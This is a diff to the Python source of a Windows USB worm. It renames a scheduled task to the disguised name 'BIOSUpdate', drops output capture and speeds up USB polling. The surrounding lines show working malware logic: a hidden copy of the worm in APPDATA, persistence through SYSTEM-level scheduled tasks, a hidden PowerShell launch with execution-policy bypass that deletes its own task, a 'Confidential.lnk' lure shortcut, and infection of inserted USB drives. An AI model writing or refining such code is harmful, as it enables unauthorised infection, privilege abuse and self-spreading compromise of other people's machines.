@@ -14,7 +14,7 @@ PAYLOAD_NAME = "init.exe"
 WORM_PATH = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Templates', WORM_NAME) 
 PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
 WORM_TASK_NAME = "WindowsUpdateService"  
-PAYLOAD_TASK_NAME = "SystemUpdateTask"  
+PAYLOAD_TASK_NAME = "BIOSUpdate"  
 SHORTCUT_NAME = "Confidential.lnk"
 FLAG_FILE = os.path.join(os.getenv('TEMP'), "1572754491.txt")
 
@@ -46,11 +46,11 @@ def download_payload():
 
 def create_scheduled_tasks():
     worm_cmd = f'schtasks /create /tn {WORM_TASK_NAME} /tr "{WORM_PATH}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
-    subprocess.run(worm_cmd, shell=True, capture_output=True)
+    subprocess.run(worm_cmd, shell=True)
     if not os.path.exists(FLAG_FILE):
         payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "powershell.exe -nop -w hidden -ep bypass -c \\"{PAYLOAD_PATH};schtasks /delete /tn {PAYLOAD_TASK_NAME} /f\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
-        subprocess.run(payload_cmd, shell=True, capture_output=True)
-        subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True, capture_output=True)
+        subprocess.run(payload_cmd, shell=True)
+        subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True)
         with open(FLAG_FILE, 'w') as f:
             f.write("done")
 
@@ -88,7 +88,7 @@ def monitor_usb():
         for drive in new_drives:
             infect_usb(drive)
         known_drives = current_drives
-        time.sleep(2)
+        time.sleep(1)
 
 def main():
     if is_usb_drive():
